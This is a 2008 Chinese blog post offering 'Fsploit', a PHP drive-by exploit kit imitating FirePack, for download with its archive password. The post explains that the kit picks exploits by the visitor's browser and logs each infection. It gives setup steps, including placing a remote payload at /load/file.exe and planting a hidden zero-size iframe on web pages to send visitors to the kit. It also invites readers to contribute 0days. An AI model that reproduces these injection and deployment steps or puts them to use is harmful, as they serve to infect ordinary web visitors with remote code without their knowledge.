---
title: Fsploit - 仿FirePack网马管理系统
description: 实际上这种智慧型网马会因应不同浏览器产生不同的漏洞做攻击，而且在加载之后会进行记录和统计分析大体上IEFirefoxOpera都能感染我模仿FirePack系统程式码(很抱歉我不是在使用简体中文的环境里所以不是做简中的介面)并将网马0day原始码部分加密
date: 2008-02-28 08:41:07
category: 安全工具
tags: ['木马', '网马', 'PHP', '浏览器']
post_id: 385
alias: f3v3r-fsploit-as-FirePack
ViewNums: 4602
---

来源：LiFediy's blog

by:f3v3r

关于FirePack请参见PandaLabs在今年情人节的文章
[http://pandalabs.pandasecurity.com/archive/FirePack-for-the-winter.aspx](http://pandalabs.pandasecurity.com/archive/FirePack-for-the-winter.aspx "http://pandalabs.pandasecurity.com/archive/FirePack-for-the-winter.aspx")
尽管你可能看过或用过IcePack或是MPack之类的系统

不过文章提到这版本的价钱一定让你大开眼界it is really expensive compared to other kits: 3000$,将近三千元美金的高价(MPack一千元)

实际上这种智慧型网马会因应不同[浏览器](/tags/%E6%B5%8F%E8%A7%88%E5%99%A8)产生不同的[漏洞](/tags/%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF)做攻击，而且在加载之后会进行记录和统计分析大体上IE Firefox Opera都能感染

我模仿FirePack系统程式码(很抱歉我不是在使用简体中文的环境里所以不是做简中的介面)并将网马[0day](/tags/0day)原始码部分加密

可运行通过我自己的[卡巴斯基](/tags/%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BAKaspersky)网路安全套装软体(因为在某些[exploit](/tags/exploit)原始码的部分有加注打论顺序)

本系统无须配置SQL资料库，纯粹使用PHP环境即可运行

大略解释下安装流程

1.先编辑config.php内容达到你要的配置，并将档案上传到网页伺服器里，要远端执行的档案放在/load/file.exe另外ref.db要CHMOD 777
2.浏览 http://xxx/fsploit/admin/  输入帐号密码进入管理介面(附图如下)
3.使用一般挂马语法挂马
```html
<iframe src=http://xxx/fsploit/index.php width=0 height=0></iframe> //挂马的src就是根目录的index.php
```
4.所有的exploit都已经集结完成，会按浏览者的浏览器做出不同攻击
5.坐下来，慢慢等，不用着急，谁几点几分从哪里踩中网马都记得分明
以上写到这里.
这款[php](/tags/PHP)程序中马率或许看起来不高，不过这种机关枪的打法比狙击枪的打法杀的更多,如果你有其他0day愿意分享我可以加到payload里，你有兴趣的话也可以自己试试看.
档案解压缩密码: f3v3r
MD5 : f82e789df8c4bccfb42b8f3276cf80c1
[![](http://pic.yupoo.com/sunlei/75380528a260/700sn5wq.jpg)](http://pic.yupoo.com/sunlei/75380528a260/700sn5wq.jpg)

[下载](/tags/%E4%B8%8B%E8%BD%BDDownload)地址：[fsploit.rar](/blog/download.asp?id=53

